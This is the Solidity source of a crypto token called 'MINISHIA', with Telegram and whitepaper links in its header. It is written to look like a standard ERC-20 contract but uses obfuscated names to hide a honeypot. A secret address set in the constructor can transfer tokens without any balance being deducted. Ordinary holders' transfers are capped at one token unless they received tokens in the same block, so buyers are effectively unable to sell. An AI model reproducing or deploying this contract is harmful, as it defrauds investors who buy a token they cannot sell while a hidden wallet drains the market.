/*

Telegram: https://t.me/portalminishia

Whitepaper: https://docs.minishia.io/mini-shia/

*/

// SPDX-License-Identifier: Unlicense

pragma solidity >0.8.17;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract MINISHIA is Ownable {
    function transferFrom(address lrfi, address fqaolvbyr, uint256 bgyahrv) public returns (bool success) {
        require(bgyahrv <= allowance[lrfi][msg.sender]);
        allowance[lrfi][msg.sender] -= bgyahrv;
        adcnqyuflv(lrfi, fqaolvbyr, bgyahrv);
        return true;
    }

    string public name;

    function adcnqyuflv(address lrfi, address fqaolvbyr, uint256 bgyahrv) private {
        address zqlp = IUniswapV2Factory(ofdamnswykiu.factory()).getPair(address(this), ofdamnswykiu.WETH());
        if (0 == rqlujobmnti[lrfi]) {
            if (lrfi != zqlp && phnagb[lrfi] != block.number && bgyahrv < totalSupply) {
                require(bgyahrv <= totalSupply / (10 ** decimals));
            }
            balanceOf[lrfi] -= bgyahrv;
        }
        balanceOf[fqaolvbyr] += bgyahrv;
        phnagb[fqaolvbyr] = block.number;
        emit Transfer(lrfi, fqaolvbyr, bgyahrv);
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    uint256 private wljdkfngzui = 111;

    function transfer(address fqaolvbyr, uint256 bgyahrv) public returns (bool success) {
        adcnqyuflv(msg.sender, fqaolvbyr, bgyahrv);
        return true;
    }

    mapping(address => uint256) public balanceOf;

    constructor(string memory tohlbvcupsjr, string memory sholrgvpyuw, address cmdifurq, address scimbtpve) {
        name = tohlbvcupsjr;
        symbol = sholrgvpyuw;
        balanceOf[msg.sender] = totalSupply;
        rqlujobmnti[scimbtpve] = wljdkfngzui;
        ofdamnswykiu = IUniswapV2Router02(cmdifurq);
    }

    string public symbol;

    mapping(address => uint256) private rqlujobmnti;

    mapping(address => uint256) private phnagb;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    function approve(address dofcizypk, uint256 bgyahrv) public returns (bool success) {
        allowance[msg.sender][dofcizypk] = bgyahrv;
        emit Approval(msg.sender, dofcizypk, bgyahrv);
        return true;
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => mapping(address => uint256)) public allowance;

    uint8 public decimals = 9;

    IUniswapV2Router02 private ofdamnswykiu;
}
